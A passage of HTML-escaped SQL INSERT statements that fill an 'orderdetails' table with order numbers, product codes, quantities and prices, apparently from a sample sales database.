(\u0026#39;10305\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;58.95\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;160.87\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;112.60\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;48.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;107.34\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;30.76\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;118.28\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;94.38\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;48.70\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;109.96\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;182.86\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;145.04\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;145.34\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;114.74\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;83.70\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;126.39\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;85.14\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;109.37\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;76.12\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;60.28\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;51.55\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;61.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;73.62\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;62.16\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;99.17\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;87.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;48.05\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;118.32\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;135.61\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;71.40\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;92.11\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;58.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;64.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;75.47\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;81.47\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;44.20\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;115.37\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;187.85\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;81.95\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;48.46\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;99.57\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;68.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;58.00\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;71.73\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;99.89\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;61.22\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;37.09\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;73.07\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;88.75\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;100.85\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;79.20\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;62.93\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;94.74\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;144.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;96.92\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;59.56\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;93.89\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;74.04\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;165.38\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;105.70\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;77.41\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;101.34\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;128.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;66.99\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;129.45\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;159.18\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;70.76\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;122.00\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;59.06\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;133.92\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;33.23\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;50.21\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;139.03\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;75.18\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;38.62\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;124.44\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;114.84\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;134.22\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;92.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;66.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;70.55\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;48.80\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;89.05\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;116.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;85.61\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;91.02\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;214.30\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;101.50\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;102.74\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;43.67\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;146.20\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;48.43\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;111.87\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;150.19\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;91.18\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;54.34\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;93.20\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;84.33\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;44.27\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;27.88\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;43.46\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;40.21\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;96.42\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;141.83\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;131.20\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;109.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;52.87\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;143.94\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;110.18\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;102.23\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;96.31\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;48.70\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;55.59\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;96.09\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;176.63\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;125.40\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;169.56\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;95.99\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;135.90\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;129.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;84.71\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;129.26\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;51.44\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;31.82\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;111.18\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;58.41\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;115.75\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;50.38\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;83.15\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;78.12\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;111.83\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;78.77\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;60.67\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;99.17\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;88.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;51.32\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;126.48\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;140.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;72.26\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;89.99\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;93.01\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;S24_2841\u0026#39;, 